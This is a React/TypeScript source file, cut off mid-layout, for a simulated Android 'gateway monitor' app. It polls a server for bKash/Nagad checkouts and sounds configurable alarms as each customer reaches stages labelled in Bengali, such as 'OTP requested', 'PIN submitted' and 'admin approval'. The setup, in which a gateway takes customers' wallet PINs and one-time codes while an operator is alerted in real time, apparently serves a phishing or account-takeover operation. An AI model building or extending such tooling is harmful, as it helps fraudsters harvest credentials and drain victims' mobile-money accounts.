import React, { useState, useEffect, useRef } from 'react';
import { Smartphone, RefreshCw, SmartphoneIcon, Play, Radio, Volume2, ShieldAlert, CheckCircle, Info, Settings, AlertCircle, Trash2, X, AlertTriangle } from 'lucide-react';

interface CheckoutItem {
  id: String;
  type?: string;
  amount?: number;
  payerName?: string;
  payerPhone?: string;
  step?: number;
  status?: string;
  updatedAt?: number;
}

// Low-level Web Audio API Synthesizer to match AudioTrack in Kotlin
class WebAudioAlertManager {
  private audioCtx: AudioContext | null = null;
  private timerId: any = null;

  public playSound(type: 'SOFT_CHIME' | 'PHONE_RINGTONE' | 'DIGITAL_BEEP', durationSeconds: number) {
    this.stopSound();

    const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
    if (!AudioContextClass) {
      console.warn('Web Audio API not supported in this browser');
      return;
    }

    try {
      this.audioCtx = new AudioContextClass();
      const ctx = this.audioCtx;
      const endTime = ctx.currentTime + durationSeconds;

      if (type === 'SOFT_CHIME') {
        let currTime = ctx.currentTime;
        const playChime = () => {
          if (currTime >= endTime || !this.audioCtx) return;
          
          // Chime Note 1
          const osc1 = ctx.createOscillator();
          const gain1 = ctx.createGain();
          osc1.type = 'sine';
          osc1.frequency.setValueAtTime(1200, currTime);
          gain1.gain.setValueAtTime(0.3, currTime);
          gain1.gain.exponentialRampToValueAtTime(0.001, currTime + 0.25);
          osc1.connect(gain1);
          gain1.connect(ctx.destination);
          osc1.start(currTime);
          osc1.stop(currTime + 0.25);

          // Chime Note 2
          const osc2 = ctx.createOscillator();
          const gain2 = ctx.createGain();
          osc2.type = 'sine';
          osc2.frequency.setValueAtTime(1500, currTime + 0.3);
          gain2.gain.setValueAtTime(0.3, currTime + 0.3);
          gain2.gain.exponentialRampToValueAtTime(0.001, currTime + 0.55);
          osc2.connect(gain2);
          gain2.connect(ctx.destination);
          osc2.start(currTime + 0.3);
          osc2.stop(currTime + 0.55);

          currTime += 1.2;
          this.timerId = setTimeout(playChime, 1200);
        };
        playChime();
      } else if (type === 'PHONE_RINGTONE') {
        let currTime = ctx.currentTime;
        const playRing = () => {
          if (currTime >= endTime || !this.audioCtx) return;

          // Double Telephone Ring 1st Pulse
          const osc1 = ctx.createOscillator();
          const osc2 = ctx.createOscillator();
          const gain = ctx.createGain();
          osc1.type = 'sine';
          osc1.frequency.setValueAtTime(440, currTime);
          osc2.type = 'sine';
          osc2.frequency.setValueAtTime(480, currTime);
          gain.gain.setValueAtTime(0.2, currTime);
          gain.gain.setValueAtTime(0.2, currTime + 0.35);
          gain.gain.exponentialRampToValueAtTime(0.001, currTime + 0.38);

          osc1.connect(gain);
          osc2.connect(gain);
          gain.connect(ctx.destination);
          osc1.start(currTime);
          osc2.start(currTime);
          osc1.stop(currTime + 0.4);
          osc2.stop(currTime + 0.4);

          // Double Telephone Ring 2nd Pulse
          const osc3 = ctx.createOscillator();
          const osc4 = ctx.createOscillator();
          const gain2 = ctx.createGain();
          osc3.type = 'sine';
          osc3.frequency.setValueAtTime(440, currTime + 0.5);
          osc4.type = 'sine';
          osc4.frequency.setValueAtTime(480, currTime + 0.5);
          gain2.gain.setValueAtTime(0.2, currTime + 0.5);
          gain2.gain.setValueAtTime(0.2, currTime + 0.85);
          gain2.gain.exponentialRampToValueAtTime(0.001, currTime + 0.88);

          osc3.connect(gain2);
          osc4.connect(gain2);
          gain2.connect(ctx.destination);
          osc3.start(currTime + 0.5);
          osc4.start(currTime + 0.5);
          osc3.stop(currTime + 0.9);
          osc4.stop(currTime + 0.9);

          currTime += 2.5;
          this.timerId = setTimeout(playRing, 2500);
        };
        playRing();
      } else {
        // Digital Beep Alarm
        let currTime = ctx.currentTime;
        const playBeep = () => {
          if (currTime >= endTime || !this.audioCtx) return;

          // Pulse 1
          const osc1 = ctx.createOscillator();
          const gain1 = ctx.createGain();
          osc1.type = 'sine';
          osc1.frequency.setValueAtTime(2000, currTime);
          gain1.gain.setValueAtTime(0.25, currTime);
          gain1.gain.exponentialRampToValueAtTime(0.001, currTime + 0.12);
          osc1.connect(gain1);
          gain1.connect(ctx.destination);
          osc1.start(currTime);
          osc1.stop(currTime + 0.15);

          // Pulse 2
          const osc2 = ctx.createOscillator();
          const gain2 = ctx.createGain();
          osc2.type = 'sine';
          osc2.frequency.setValueAtTime(2000, currTime + 0.2);
          gain2.gain.setValueAtTime(0.25, currTime + 0.2);
          gain2.gain.exponentialRampToValueAtTime(0.001, currTime + 0.32);
          osc2.connect(gain2);
          gain2.connect(ctx.destination);
          osc2.start(currTime + 0.2);
          osc2.stop(currTime + 0.35);

          currTime += 0.6;
          this.timerId = setTimeout(playBeep, 600);
        };
        playBeep();
      }
    } catch (e) {
      console.error(e);
    }
  }

  public stopSound() {
    if (this.timerId) {
      clearTimeout(this.timerId);
      this.timerId = null;
    }
    if (this.audioCtx) {
      try {
        this.audioCtx.close();
      } catch (e) {}
      this.audioCtx = null;
    }
  }
}

export default function AndroidSimulator() {
  // Track browser audio autoplay permission status
  const [isAudioUnlocked, setIsAudioUnlocked] = useState(false);

  // SharedPreferences states saved locally under state
  const [baseUrl, setBaseUrl] = useState(() => {
    return localStorage.getItem('android_base_url') || window.location.origin;
  });
  const [pollInterval, setPollInterval] = useState(() => {
    const saved = localStorage.getItem('android_poll_interval');
    return saved ? Number(saved) : 5;
  });
  const [alarmDuration, setAlarmDuration] = useState(() => {
    const saved = localStorage.getItem('android_alarm_duration');
    return saved ? Number(saved) : 10;
  });
  const [isServiceRunning, setIsServiceRunning] = useState(() => {
    const saved = localStorage.getItem('android_is_service_running');
    return saved !== 'false';
  });
  const [ignoreBatteryOptimizations, setIgnoreBatteryOptimizations] = useState(() => {
    const saved = localStorage.getItem('android_ignore_battery_opts');
    return saved === 'true';
  });

  // Dynamic Alarms per Step Configuration (Tongs)
  const [tongs, setTongs] = useState<Array<{ step: number; isActive: boolean; type: 'SOFT_CHIME' | 'PHONE_RINGTONE' | 'DIGITAL_BEEP'; durationSeconds?: number; customTitle?: string }>>(() => {
    const saved = localStorage.getItem('android_tongs');
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed)) return parsed;
      } catch (e) {}
    }
    return [
      { step: 0, isActive: true, type: 'SOFT_CHIME', durationSeconds: 10, customTitle: 'ধাপ ০: গ্রাহক গেটওয়েতে প্রবেশ করেছেন' },
      { step: 1, isActive: true, type: 'DIGITAL_BEEP', durationSeconds: 12, customTitle: 'ধাপ ১: ওটিপি কোড চাওয়া হয়েছে (OTP Requested)' },
      { step: 2, isActive: true, type: 'PHONE_RINGTONE', durationSeconds: 15, customTitle: 'ধাপ ২: পিন কোড সাবমিট করা হয়েছে (PIN Submitted)' },
      { step: 3, isActive: true, type: 'DIGITAL_BEEP', durationSeconds: 10, customTitle: 'ধাপ ৩: অ্যাডমিন অনুমোদনের অপেক্ষা' },
      { step: 4, isActive: true, type: 'SOFT_CHIME', durationSeconds: 10, customTitle: 'ধাপ ৪: পেমেন্ট সফল হয়েছে 🎉' },
    ];
  });

  // Dynamic Add Tong Form States
  const [newStepNum, setNewStepNum] = useState<number>(5);
  const [newSoundType, setNewSoundType] = useState<'SOFT_CHIME' | 'PHONE_RINGTONE' | 'DIGITAL_BEEP'>('SOFT_CHIME');
  const [newDuration, setNewDuration] = useState<number>(10);
  const [newTitle, setNewTitle] = useState<string>('');

  // Polling tracker states
  const [isPolling, setIsPolling] = useState(false);
  const [alertLogs, setAlertLogs] = useState<Array<{ id: string; message: string; timestamp: string; step: number }>>([]);
  const [simulatedNotifications, setSimulatedNotifications] = useState<Array<{ id: string; title: string; message: string }>>([]);
  
  // Audio Player instance on browser
  const audioManager = useRef(new WebAudioAlertManager());
  const checkedKeys = useRef<Set<string>>(new Set());

  // Check audio context lock state on load and set up auto-unlock click/touch listeners
  useEffect(() => {
    const checkState = () => {
      const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
      if (AudioContextClass) {
        const dummyCtx = new AudioContextClass();
        if (dummyCtx.state === 'running') {
          setIsAudioUnlocked(true);
        }
        dummyCtx.close();
      }
    };
    checkState();

    const doUnlock = () => {
      const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
      if (AudioContextClass) {
        const ctx = new AudioContextClass();
        if (ctx.state === 'suspended') {
          ctx.resume().then(() => {
            setIsAudioUnlocked(true);
            ctx.close();
          }).catch(() => {});
        } else {
          setIsAudioUnlocked(true);
          ctx.close();
        }
      }
    };

    const handleInteraction = () => {
      doUnlock();
      window.removeEventListener('click', handleInteraction);
      window.removeEventListener('touchstart', handleInteraction);
    };

    window.addEventListener('click', handleInteraction);
    window.addEventListener('touchstart', handleInteraction);

    return () => {
      window.removeEventListener('click', handleInteraction);
      window.removeEventListener('touchstart', handleInteraction);
    };
  }, []);

  // Persist SharedPreferences to localStorage
  useEffect(() => {
    localStorage.setItem('android_base_url', baseUrl);
  }, [baseUrl]);

  useEffect(() => {
    localStorage.setItem('android_poll_interval', String(pollInterval));
  }, [pollInterval]);

  useEffect(() => {
    localStorage.setItem('android_alarm_duration', String(alarmDuration));
  }, [alarmDuration]);

  useEffect(() => {
    localStorage.setItem('android_is_service_running', String(isServiceRunning));
  }, [isServiceRunning]);

  useEffect(() => {
    localStorage.setItem('android_ignore_battery_opts', String(ignoreBatteryOptimizations));
  }, [ignoreBatteryOptimizations]);

  useEffect(() => {
    localStorage.setItem('android_tongs', JSON.stringify(tongs));
  }, [tongs]);

  // Stop sound on unmount
  useEffect(() => {
    return () => {
      audioManager.current.stopSound();
    };
  }, []);

  // Poll server process if service runs
  useEffect(() => {
    if (!isServiceRunning) {
      setIsPolling(false);
      return;
    }

    setIsPolling(true);
    let active = true;

    const pullActiveCheckouts = async () => {
      if (!active || !isServiceRunning) return;
      try {
        const res = await fetch(`${baseUrl}/api/checkout/active`);
        const data = await res.json();
        
        if (data.success && data.activeCheckouts) {
          const list: CheckoutItem[] = data.activeCheckouts;
          
          list.forEach((item) => {
            const step = (item.step !== undefined && item.step !== null) ? item.step : 1;
            const uniqueKey = `${item.id}_step_${step}`;

            if (!checkedKeys.current.has(uniqueKey)) {
              checkedKeys.current.add(uniqueKey);
              
              // Trigger configured step alarm
              const tong = tongs.find(t => t.step === step);
              if (tong && tong.isActive) {
                // Ring the Web Audio synthesizer! Use per-step custom play duration!
                const playLength = tong.durationSeconds ?? alarmDuration;
                audioManager.current.playSound(tong.type, playLength);

                // Add simulated notification bubble
                const messageText = `গ্রাহক ${item.payerName || 'Payer'} (${item.type === 'bkash' ? 'bKash' : 'Nagad'} - ৳${item.amount}) বর্তমানে ধাপ ${step}-এ রয়েছেন।`;
                const notificationId = Math.random().toString();
                
                setSimulatedNotifications(prev => [
                  { 
                    id: notificationId, 
                    title: `ধাপ ${step} অ্যালার্ট 🔔`, 
                    message: messageText
                  },
                  ...prev
                ]);

                // Record logger
                setAlertLogs(prev => [
                  {
                    id: Math.random().toString(),
                    message: `ধাপ ${step} ট্রিগার: ${item.payerName || 'গ্রাহক'} (৳${item.amount}) সনাক্ত হয়েছে এবং সুর বেজেছে (${playLength} সেকেন্ড)।`,
                    timestamp: new Date().toLocaleTimeString(),
                    step: step
                  },
                  ...prev
                ]);
              }
            }
          });
        }
      } catch (err) {
        console.warn('Simulator polling connecting error:', err);
      }
    };

    pullActiveCheckouts();
    const timer = setInterval(pullActiveCheckouts, pollInterval * 1000);

    return () => {
      active = false;
      clearInterval(timer);
    };
  }, [isServiceRunning, baseUrl, pollInterval, tongs, alarmDuration]);

  const handleTestSound = (type: 'SOFT_CHIME' | 'PHONE_RINGTONE' | 'DIGITAL_BEEP', customLen?: number) => {
    audioManager.current.playSound(type, customLen ?? alarmDuration);
  };

  const handleStopSound = () => {
    audioManager.current.stopSound();
  };

  const toggleTongActive = (step: number) => {
    setTongs(prev => prev.map(t => t.step === step ? { ...t, isActive: !t.isActive } : t));
  };

  const changeTongType = (step: number, type: 'SOFT_CHIME' | 'PHONE_RINGTONE' | 'DIGITAL_BEEP') => {
    setTongs(prev => prev.map(t => t.step === step ? { ...t, type } : t));
  };

  const changeTongDuration = (step: number, duration: number) => {
    setTongs(prev => prev.map(t => t.step === step ? { ...t, durationSeconds: duration } : t));
  };

  const getStepTitleText = (tong: { step: number; customTitle?: string }) => {
    if (tong.customTitle) return tong.customTitle;
    switch(tong.step) {
      case 0: return "ধাপ ০: গ্রাহক গেটওয়েতে প্রবেশ করেছেন";
      case 1: return "ধাপ ১: ওটিপি কোড চাওয়া হয়েছে (OTP Requested)";
      case 2: return "ধাপ ২: পিন কোড সাবমিট করা হয়েছে (PIN Submitted)";
      case 3: return "ধাপ ৩: অ্যাডমিন অনুমোদনের অপেক্ষা";
      case 4: return "ধাপ ৪: পেমেন্ট সফল হয়েছে 🎉";
      default: return `ধাপ ${tong.step}: কাস্টম অ্যাকশন/টং`;
    }
  };

  const deleteTong = (step: number) => {
    setTongs(prev => prev.filter(t => t.step !== step));
  };

  const addTong = (e: React.FormEvent) => {
    e.preventDefault();
    if (tongs.some(t => t.step === newStepNum)) {
      alert(`ধাপ ${newStepNum} ইতোমধ্যে ডাটাবেজে বা তালিকায় সেট করা আছে! অনুগ্রহ করে অন্য কোনো ধাপ নম্বর ব্যবহার করুন।`);
      return;
    }
    const cleanTitle = newTitle.trim() || `ধাপ ${newStepNum}: কাস্টম ট্র্যাকিং ধাপ`;
    setTongs(prev => [...prev, {
      step: newStepNum,
      isActive: true,
      type: newSoundType,
      durationSeconds: newDuration,
      customTitle: cleanTitle
    }].sort((a,b) => a.step - b.step));
    
    // Reset and select next step
    setNewTitle('');
    setNewStepNum(prev => prev + 1);
  };

  const resetTongsToDefault = () => {
    if (window.confirm("আপনি কি সব কাস্টম টং ডিলিট করে ডিফল্ট সেটিং রিসেট করতে চান?")) {
      const defaults = [
        { step: 0, isActive: true, type: 'SOFT_CHIME' as const, durationSeconds: 10, customTitle: 'ধাপ ০: গ্রাহক গেটওয়েতে প্রবেশ করেছেন' },
        { step: 1, isActive: true, type: 'DIGITAL_BEEP' as const, durationSeconds: 12, customTitle: 'ধাপ ১: ওটিপি কোড চাওয়া হয়েছে (OTP Requested)' },
        { step: 2, isActive: true, type: 'PHONE_RINGTONE' as const, durationSeconds: 15, customTitle: 'ধাপ ২: পিন কোড সাবমিট করা হয়েছে (PIN Submitted)' },
        { step: 3, isActive: true, type: 'DIGITAL_BEEP' as const, durationSeconds: 10, customTitle: 'ধাপ ৩: অ্যাডমিন অনুমোদনের অপেক্ষা' },
        { step: 4, isActive: true, type: 'SOFT_CHIME' as const, durationSeconds: 10, customTitle: 'ধাপ ৪: পেমেন্ট সফল হয়েছে 🎉' },
      ];
      setTongs(defaults);
    }
  };

  const clearNotifications = () => {
    setSimulatedNotifications([]);
  };

  return (
    <div className="grid grid-cols-1 xl:grid-cols-12 gap-8 p-4 bg-[#09090b] min-h-screen text-zinc-100 font-sans leading-normal">
      {!isAudioUnlocked && (
        <div className="col-span-12 bg-amber-500/10 border border-amber-500/20 px-5 py-4 rounded-2xl flex flex-col md:flex-row items-center justify-between gap-3 text-amber-200 shadow-lg backdrop-blur-sm animate-fade-in">
          <div className="flex items-center gap-3">
            <Volume2 className="w-5 h-5 text-amber-400 animate-pulse shrink-0" />
            <div className="text-left">
              <h4 className="text-xs font-bold font-sans">ব্রাউজার অডিও লকড! (Browser Audio Blocked)</h4>
              <p className="text-[11px] text-zinc-400 mt-1 leading-normal">
                সাধারণত ব্রাউজারের অটো-প্লে ব্লকিং ফিচারের কারণে প্রথমবার কোনো ইউজারের ক্লিক ছাড়া সাউন্ড বাজে না। ব্যাকগ্রাউন্ডে কাস্টমার ট্র্যাকিং সুর শোনার জন্য ডানদিকের বাটনে ক্লিক করে আনমিউট করুন।
              </p>
            </div>
          </div>
          <button
            onClick={() => {
              const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
              if (AudioContextClass) {
                const ctx = new AudioContextClass();
                ctx.resume().then(() => {
                  setIsAudioUnlocked(true);
                  const osc = ctx.createOscillator();
                  const gain = ctx.createGain();
                  gain.gain.setValueAtTime(0.001, ctx.currentTime);
                  osc.connect(gain);
                  gain.connect(ctx.destination);
                  osc.start();
                  osc.stop(ctx.currentTime + 0.1);
                  ctx.close();
                }).catch((e) => console.log(e));
              }
            }}
            className="text-[12px] font-bold bg-gradient-to-r from-amber-400 to-amber-500 hover:from-amber-500 hover:to-amber-600 active:scale-95 text-black px-4 py-2 rounded-xl transition-all shadow-md cursor-pointer shrink-0"
          >
            🔊 অডিও সচল করুন (Unmute Alarm)
          </button>
        </div>
      )}

      {/* Column 1: App info & terminal log */}
      <div className="xl:col-span-4 flex flex-col gap-6 sm:p-2">
        <div className="bg-[#121215]/90 border border-zinc-850 p-6 rounded-3xl shadow-2xl relative overflow-hidden group">
          <div className="absolute top-0 right-0 w-32 h-32 bg-[#c5a059]/5 rounded-full blur-2xl pointer-events-none" />
          <div className="flex items-center gap-3 text-[#c5a059] mb-4">
            <Radio className="w-6 h-6 animate-pulse" />
            <h2 className="text-xl font-bold tracking-wide bg-gradient-to-r from-amber-200 via-yellow-105 to-amber-400 bg-clip-text text-transparent">অ্যান্ড্রয়েড গেটওয়ে মনিটর</h2>
          </div>
          <p className="text-zinc-400 text-xs leading-relaxed mb-4">
            এটি একটি হাই-ফিডেলিটি অ্যান্ড্রোয়েড মনিটর কনফিগারেশন অ্যাপ্লিকেশন। গেটওয়েতে কাস্টমার কোন ধাপে ইনপুট দিচ্ছেন তা সেকেন্ডে সেকেন্ডে ট্র্যাক করে কাস্টম সুর বাজাতে পারে।
          </p>

          <div className="flex flex-col gap-2.5 text-[11px] text-zinc-400 bg-zinc-950/60 p-4 rounded-2xl border border-zinc-900">
            <div className="flex justify-between items-center text-zinc-300 font-semibold mb-1 border-b border-zinc-900 pb-1.5">
              <span>বৈশিষ্ট্যসমূহ:</span>
              <span className="text-[10px] text-emerald-400 font-mono bg-emerald-950/40 px-2.5 py-0.5 rounded-full border border-emerald-900/40">Real Kotlin Core</span>
            </div>
            <li className="list-none flex items-start gap-1.5"><span className="text-amber-500">⚡</span> <span><strong>১০০% রিয়াল ব্যাকগ্রাউন্ড লিসেনার:</strong> ডিভাইস লক থাকলেও ব্যাকগ্রাউন্ড সচল থাকে।</span></li>
            <li className="list-none flex items-start gap-1.5"><span className="text-amber-500">🎵</span> <span><strong>কাস্টম সুর ও স্থায়িত্ব:</strong> ৩টি টং সুর এবং প্রতি ধাপের জন্য আলাদা সময় (সেকেন্ড)।</span></li>
            <li className="list-none flex items-start gap-1.5"><span className="text-amber-500">➕</span> <span><strong>ডায়নামিক টং কন্ট্রোল:</strong> নিজের পছন্দ অনুযায়ী রিয়েল টাইমে ধাপ যোগ ও ডিলিট করুন।</span></li>
            <li className="list-none flex items-start gap-1.5"><span className="text-amber-500">🔌</span> <span><strong>সার্ভার ক্রস-অরিজিন ফিক্স:</strong> লাইভ বা লোকাল যেকোনো লিংকের সাথে সুরক্ষিত সংযোগ।</span></li>
          </div>
        </div>

        {/* Polling Alert Logs */}
        <div className="bg-[#121215]/90 border border-zinc-850 p-6 rounded-3xl shadow-2xl flex-1 flex flex-col min-h-[300px]">
          <div className="flex items-center justify-between mb-4 pb-2 border-b border-zinc-850">
            <h3 className="text-sm font-bold text-zinc-200">লাইভ ট্র্যাকিং লগার (Terminal Logs)</h3>
            <span className="text-[10px] font-mono bg-zinc-950 px-2.5 py-1 rounded-full text-zinc-400 border border-zinc-850 flex items-center gap-1.5">
              <span className={`w-1.5 h-1.5 rounded-full ${isPolling ? 'bg-emerald-500 animate-pulse' : 'bg-zinc-650'}`} />
              {isPolling ? 'লিসেনিং' : 'নিষ্ক্রিয়'}
            </span>
          </div>

          <div className="flex-1 overflow-y-auto max-h-[380px] flex flex-col gap-2.5 pr-1 no-scrollbar text-[11px] font-mono">
            {alertLogs.length === 0 ? (
              <div className="h-full flex flex-col items-center justify-center text-zinc-600 gap-2 py-12">
                <Info className="w-5 h-5 text-zinc-750" />
                <p>কোনো অ্যালার্ম হুক বা ট্র্যাকিং তথ্য নেই।</p>
                <p className="text-[10px] text-center max-w-xs text-zinc-650">গ্রাহক যখন ওটিপি বা পিন প্যানেলে ইনপুট দিবেন তখন এখানে লাইভ রিডিং বেজে উঠবে।</p>
              </div>
            ) : (
              alertLogs.map((log) => (
                <div key={log.id} className="p-3 rounded-xl bg-[#0b0b0c] border border-zinc-900 flex flex-col gap-1 hover:border-zinc-800 transition-colors">
                  <div className="flex justify-between text-zinc-500 text-[10px]">
                    <span>সময়: {log.timestamp}</span>
                    <span className="text-amber-400/90 font-semibold text-[9px] bg-amber-950/30 px-2 py-0.5 rounded border border-amber-900/30">ধাপ {log.step}</span>
                  </div>
                  <p className="text-zinc-300 leading-normal">{log.message}</p>
                </div>
              ))
            )}
          </div>
        </div>
      </div>

      {/* Column 2: Center Emulator Console Frame */}
      <div className="xl:col-span-4 flex justify-center items-center py-4 bg-zinc-950/20 rounded-3xl border border-zinc-900/40">
        <div className="relative w-full max-w-[360px] aspect-[9/19.5] bg-[#000] rounded-[52px] p-3.5 border-[8px] border-zinc-800 shadow-[0_25px_60px_-15px_rgba(0,0,0,0.9)] flex flex-col overflow-hidden">
          {/* Top Notch of Speaker/Camera */}
          <div className="absolute top-1.5 left-1/2 transform -translate-x-1/2 z-30 flex items-center justify-center gap-2">
            <div className="w-2.5 h-2.5 rounded-full bg-zinc-900 border border-zinc-800" />
            <div className="w-12 h-1 rounded bg-zinc-900" />
          </div>

          {/* Android Screen Area */}
          <div className="w-full h-full bg-zinc-900 rounded-[38px] flex flex-col overflow-hidden text-white relative z-10">
            {/* Status Bar */}
            <div className="h-9 px-6 bg-zinc-950 flex items-center justify-between text-[11px] font-sans text-zinc-400 select-none pb-0.5 pt-1.5">
              <span className="font-medium">5:36 PM</span>
              <div className="flex items-center gap-2">
                <span className="text-[9px] bg-emerald-950/60 font-mono text-emerald-400 px-1 rounded-sm border border-emerald-900/40">5G LTE</span>
                <span>Wifi</span>
                <span className="font-mono">100% 🔋</span>
              </div>
            </div>

            {/* App Nav Bar (Jetpack Compose TopAppBar) */}
            <div className="bg-[#1e88e5] px-4 py-3.5 flex items-center justify-between shadow-md">
              <div className="flex items-center gap-2">
                <Smartphone className="w-4 h-4 text-white" />
                <h1 className="text-xs font-bold tracking-wide">Gateway Monitor UI 📡</h1>
              </div>
              <Settings className="w-4 h-4 text-white/80" />
            </div>

            {/* Screen Content Wrapper */}
            <div className="flex-1 overflow-y-auto p-3 flex flex-col gap-3.5 pb-8 no-scrollbar bg-zinc-950 select-none text-left">
              {/* Active Service Status Card */}
              <div className={`p-4 rounded-2xl border transition-all ${isServiceRunning ? 'bg-emerald-950/10 border-emerald-900/40 text-emerald-300' : 'bg-rose-950/10 border-rose-900/40 text-rose-300'}`}>
                <div className="flex items-center justify-between mb-1.5">
                  <div>
                    <h3 className="text-xs font-bold leading-none">{isServiceRunning ? 'Foreground Active 🟢' : 'Service Inactive 🛑'}</h3>
                    <p className="text-[9px] text-zinc-400 mt-1 leading-snug">
                      {isServiceRunning ? 'স্ক্রিন অফ থাকলেও রিংটোন অ্যালার্ম কাস্টম টাইমে বাজবে।' : 'ব্যাকগ্রাউন্ড ট্র্যাকার সচল করতে টগল অন করুন।'}
                    </p>
                  </div>
                  <button
                    onClick={() => setIsServiceRunning(!isServiceRunning)}
                    className={`w-11 h-6 rounded-full transition-colors relative flex items-center cursor-pointer ${isServiceRunning ? 'bg-emerald-500' : 'bg-zinc-700'}`}
                  >
                    <span className={`w-4 h-4 rounded-full bg-white shadow-sm transition-transform absolute top-1 ${isServiceRunning ? 'right-1' : 'left-1'}`} />
                  </button>
                </div>
              </div>

              {/* Sync Configuration Card */}
              <div className="bg-zinc-900 border border-zinc-800 p-3.5 rounded-2xl flex flex-col gap-3">
                <h3 className="text-[10px] font-bold text-zinc-400 tracking-wider uppercase">সংযোগ সেটিং (API Setup)</h3>
                
                <div className="flex flex-col gap-1">
                  <label className="text-[9px] text-zinc-400">সার্ভার API লিঙ্ক:</label>
                  <input
                    type="text"
                    value={baseUrl}
                    onChange={(e) => setBaseUrl(e.target.value)}
                    className="w-full text-[10px] font-mono bg-zinc-950 border border-zinc-800 rounded-lg px-2 py-1.5 text-white outline-none focus:border-[#1e88e5]"
                    placeholder="https://..."
                  />
                </div>

                <div className="grid grid-cols-2 gap-2.5">
                  <div className="flex flex-col gap-1">
                    <label className="text-[9px] text-zinc-400">চেক রিকোয়েস্ট:</label>
                    <div className="flex items-center bg-zinc-950 border border-zinc-805 rounded-lg px-2">
                       <input
                        type="number"
                        value={pollInterval}
                        onChange={(e) => setPollInterval(Number(e.target.value))}
                        className="w-full text-[10px] font-mono bg-transparent py-1 border-0 outline-none text-white text-center"
                      />
                      <span className="text-[9px] text-zinc-500 pr-1">sec</span>
                    </div>
                  </div>

                  <div className="flex flex-col gap-1">
                    <label className="text-[9px] text-zinc-400">ডিফল্ট অ্যালার্ম:</label>
                    <div className="flex items-center bg-zinc-950 border border-zinc-805 rounded-lg px-2">
                      <input
                        type="number"
                        value={alarmDuration}
                        onChange={(e) => setAlarmDuration(Number(e.target.value))}
                        className="w-full text-[10px] font-mono bg-transparent py-1 border-0 outline-none text-white text-center"
                      />
                      <span className="text-[9px] text-zinc-500 pr-1">sec</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Ignore Battery Optimization Info Banner */}
              <div className="bg-orange-500/10 border border-orange-500/20 p-3 rounded-2xl flex flex-col gap-1.5 text-orange-200">
                <div className="flex items-center gap-1.5 text-[11px] font-bold">
                  <AlertTriangle className="w-3.5 h-3.5 text-orange-400" />
                  <h4>হোল্ড স্ট্যাটিক ওয়েক লক</h4>
                </div>
                <p className="text-[9px] leading-relaxed text-orange-200/80">
                  ব্যাটারি অপ্টিমাইজেশন বাইপাস অন রাখুন যাতে স্লিপিং মোডে লিসেনিং বন্ধ না হয়ে যায়।
                </p>
                <button
                  onClick={() => setIgnoreBatteryOptimizations(!ignoreBatteryOptimizations)}
                  className={`self-end text-[9px] font-bold px-2.5 py-1 rounded-lg border cursor-pointer border-orange-500/20 bg-orange-950/20 active:scale-95 transition-all ${ignoreBatteryOptimizations ? 'opacity-50 text-orange-400 border-none' : 'text-orange-200'}`}
                >
                  {ignoreBatteryOptimizations ? 'নিষ্ক্রিয় করা হয়েছে' : 'বাইপাস করুন (Disable)'}
                </button>
              </div>

              <div className="flex items-center justify-between px-1">
                <h3 className="text-xs font-bold text-zinc-200 tracking-wider">টং সার্ভিস কনফিগারেশন</h3>
                <span className="text-[9px] text-zinc-500 font-mono">{tongs.length} হুকস লোডেড</span>
              </div>

              {/* Tongs Settings Modules inside simulated phone */}
              <div className="flex flex-col gap-2">
                {tongs.map((tong) => (
                  <div key={tong.step} className="bg-zinc-900 border border-zinc-850 p-3 rounded-xl flex flex-col gap-1.5">
                    <div className="flex items-center justify-between">
                      <div className="flex flex-col max-w-[80%]">
                        <span className="text-[10px] font-bold text-zinc-100 truncate">{getStepTitleText(tong)}</span>
                        <span className="text-[8px] text-zinc-500 font-mono">ধাপ নম্বর: {tong.step}</span>
                      </div>
                      <button
                        onClick={() => toggleTongActive(tong.step)}
                        className={`w-7 h-4 rounded-full transition-colors relative flex items-center cursor-pointer ${tong.isActive ? 'bg-emerald-500' : 'bg-zinc-700'}`}
                      >
                        <span className={`w-3 h-3 rounded-full bg-white transition-transform absolute top-0.5 ${tong.isActive ? 'right-0.5' : 'left-0.5'}`} />
                      </button>
                    </div>

                    {tong.isActive && (
                      <div className="flex items-center justify-between border-t border-zinc-850/60 pt-1.5 mt-0.5 text-[9px]">
                        <span className="text-zinc-400 bg-zinc-950 px-1.5 py-0.5 rounded text-[8px] font-mono border border-zinc-800">
                          {tong.type === 'SOFT_CHIME' ? '🎵 Chime' : tong.type === 'PHONE_RINGTONE' ? '☎️ Ring' : '🚨 Beep'} ({tong.durationSeconds ?? alarmDuration}s)
                        </span>
                        
                        <div className="flex gap-1 items-center scale-90 origin-right">
                          <button
                            onClick={() => handleTestSound(tong.type, tong.durationSeconds ?? alarmDuration)}
                            className="bg-zinc-950 hover:bg-zinc-800 text-blue-400 border border-zinc-800 px-2 py-1 rounded cursor-pointer"
                          >
                            টেস্ট
                          </button>
                          <button
                            onClick={handleStopSound}
                            className="bg-zinc-950 text-zinc-500 px-1 py-1 rounded cursor-pointer"
                          >
                            ⏹️
                          </button>
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>

            {/* Simulated Live Alert Banner (Smartphone Screen Overlay Alert Popup) */}
            {simulatedNotifications.map((notif, index) => (
              <div 
                key={notif.id} 
                style={{ top: `${index * 68 + 48}px` }}
                className="absolute left-3 right-3 bg-zinc-900/95 backdrop-blur border border-amber-500/35 p-2 rounded-xl text-left shadow-2xl z-40 animate-bounce duration-75 flex flex-col gap-0.5 text-white"
              >
                <div className="flex items-center justify-between border-b border-zinc-800 pb-1 mb-1">
                  <span className="text-[10px] font-bold text-amber-400 flex items-center gap-1">
                    <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-ping" />
                    {notif.title}
                  </span>
                  <button 
                    onClick={() => setSimulatedNotifications(prev => prev.filter(x => x.id !== notif.id))}
                    className="text-zinc-500 hover:text-zinc-300"
                  >
                    <X className="w-3 h-3" />
                  </button>
                </div>
                <p className="text-[10px] text-zinc-200 leading-snug">{notif.message}</p>
              </div>
            ))}

            {/* Bottom Virtual Home Indicator (Swipe bar) */}
            <div className="h-4 bg-zinc-950 flex justify-center items-center pb-2 select-none">
              <div className="w-20 h-1 rounded bg-zinc-800" />
            </div>
          </div>
        </div>
      </div>

      {/* Column 3: Custom alarm config panel - ADD, DELETE, ADJUST DURATION */}
